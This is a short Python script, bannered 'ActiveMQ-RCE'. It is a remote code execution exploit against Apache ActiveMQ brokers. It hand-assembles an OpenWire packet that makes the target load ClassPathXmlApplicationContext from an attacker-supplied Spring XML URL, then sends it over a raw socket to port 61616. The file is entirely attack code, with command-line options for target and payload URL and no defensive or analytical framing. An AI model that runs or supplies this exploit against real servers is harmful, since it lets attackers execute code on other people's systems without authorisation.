import socket 
import argparse 
 
def main(ip, port, url): 
    if not ip or not url: 
        print("Usage: script.py -i <ip> -p <port> -u <url>") 
        return 
     
    banner() 
     
    class_name = "org.springframework.context.support.ClassPathXmlApplicationContext" 
    message = url 
 
    header = "1f00000000000000000001" 
    body = header + "01" + int2hex(len(class_name), 4) + string2hex(class_name) + "01" + int2hex(len(message), 4) + string2hex(message) 
    payload = int2hex(len(body) // 2, 8) + body 
    data = bytes.fromhex(payload) 
 
    print("[*] Target:", f"{ip}:{port}") 
    print("[*] XML URL:", url) 
    print() 
    print("[*] Sending packet:", payload) 
 
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    conn.connect((ip, int(port))) 
    conn.send(data) 
    conn.close() 
 
def banner(): 
    print("     _        _   _           __  __  ___        ____   ____ _____ \n    / \\   ___| |_(_)_   _____|  \\/  |/ _ \\      |  _ \\ / ___| ____|\n   / _ \\ / __| __| \\ \\ / / _ \\ |\\/| | | | |_____| |_) | |   |  _|  \n  / ___ \\ (__| |_| |\\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ \n /_/   \\_\\___|\\__|_| \\_/ \\___|_|  |_|\\__\\_\\     |_| \\_\\\\____|_____|\n") 
 
def string2hex(s): 
    return s.encode().hex() 
 
def int2hex(i, n): 
    if n == 4: 
        return format(i, '04x') 
    elif n == 8: 
        return format(i, '08x') 
    else: 
        raise ValueError("n must be 4 or 8") 
 
if __name__ == "__main__": 
    parser = argparse.ArgumentParser() 
    parser.add_argument("-i", "--ip", help="ActiveMQ Server IP or Host") 
    parser.add_argument("-p", "--port", default="61616", help="ActiveMQ Server Port") 
    parser.add_argument("-u", "--url", help="Spring XML Url") 
    args = parser.parse_args() 
     
    main(args.ip, args.port, args.url)